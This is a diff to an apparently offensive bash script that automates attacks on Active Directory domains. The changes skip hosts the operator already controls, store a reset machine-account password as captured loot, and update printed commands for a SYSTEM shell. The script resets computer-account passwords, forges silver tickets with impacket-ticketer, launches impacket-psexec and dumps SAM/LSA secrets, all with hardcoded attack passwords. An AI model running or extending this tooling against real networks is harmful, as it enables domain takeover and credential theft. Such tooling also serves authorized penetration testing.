@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.50.0"
+readonly VERSION="1.50.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -4027,6 +4027,13 @@ _abuse_rbcd() {
     # computer account. Writing the attribute on a user is a dead end, so don't
     # waste a machine-account creation + noisy traceback on it.
     [[ "$target" != *\$ ]] && { info "  RBCD not applicable to user '$target' (computer accounts only)"; return 1; }
+    # Don't attack a computer we ALREADY control (e.g. the pre2k FS01$/FS02$) or our own
+    # account — RBCD/takeover there is pointless and the password reset is DESTRUCTIVE
+    # (it would break the very session we're running as). Only go after hosts we don't own.
+    if [[ "${target,,}" == "${USER,,}" ]] || _have_creds_for "$target"; then
+        info "  ${target} is already under our control → skipping RBCD/takeover"
+        return 1
+    fi
     have impacket-getST || return 1
     local ba; mapfile -t ba < <(bloody_args)
     local dch="${DC_FQDN:-$DCT}" cpass="ADAutoPwn_RBCD_123!" deleg=""; local -a delcreds=()
@@ -4102,6 +4109,8 @@ _abuse_computer_silver() {
     local target="$1"            # COMPUTER$ we control
     [[ "$DO_ABUSE" != "1" ]] && return 1
     [[ "$target" != *\$ ]] && return 1
+    # never take over a host we already own or our own machine account (destructive).
+    { [[ "${target,,}" == "${USER,,}" ]] || _have_creds_for "$target"; } && return 1
     have impacket-ticketer || { warn "  impacket-ticketer missing → can't forge a silver ticket"; return 1; }
     local ba; mapfile -t ba < <(bloody_args)
     local host="${target%\$}" newpw="Ad4Pwn_C0mp_99"
@@ -4123,6 +4132,8 @@ _abuse_computer_silver() {
     fi
     rb_record "Reset machine password of $target" "echo 'Manual: $target machine password was reset — reset/rejoin the host to restore trust'"
     loot "★ Reset ${C_BOLD}${target}${C_RESET} machine password → we now own its Kerberos keys"
+    add_secret "$newpw" "machine pw of $target (reset)"
+    queue_cred "$target" "$newpw" "" "computer takeover (machine pw reset)"
 
     local nt; nt=$(python3 -c 'from impacket.ntlm import compute_nthash;import sys;print(compute_nthash(sys.argv[1]).hex())' "$newpw" 2>/dev/null)
     [[ ! "$nt" =~ ^[0-9a-fA-F]{32}$ ]] && { warn "  could not compute NT hash → abort"; return 1; }
@@ -4138,7 +4149,8 @@ _abuse_computer_silver() {
     done
     [[ "$won" != "1" ]] && { warn "  impacket-ticketer failed for $target"; return 1; }
     note_cred_source "${imp}@${host}" "Silver ticket (computer takeover of $target)"
-    loot "  → KRB5CCNAME=$cc impacket-psexec -k -no-pass ${host}.${DOMAIN}   (SYSTEM shell; or wmiexec/smbexec — RpcEptMapper not even needed)"
+    loot "  → access ${host} AS ${imp}: KRB5CCNAME=$cc impacket-psexec -k -no-pass ${host}.${DOMAIN}  (or wmiexec / RDP)"
+    loot "    if ${imp} is local admin there → SYSTEM directly; otherwise it's interactive access → RpcEptMapper Performance-DLL → SYSTEM"
 
     # Convert it now: dump the host's local secrets (SAM/LSA) via the ticket.
     if have impacket-secretsdump; then
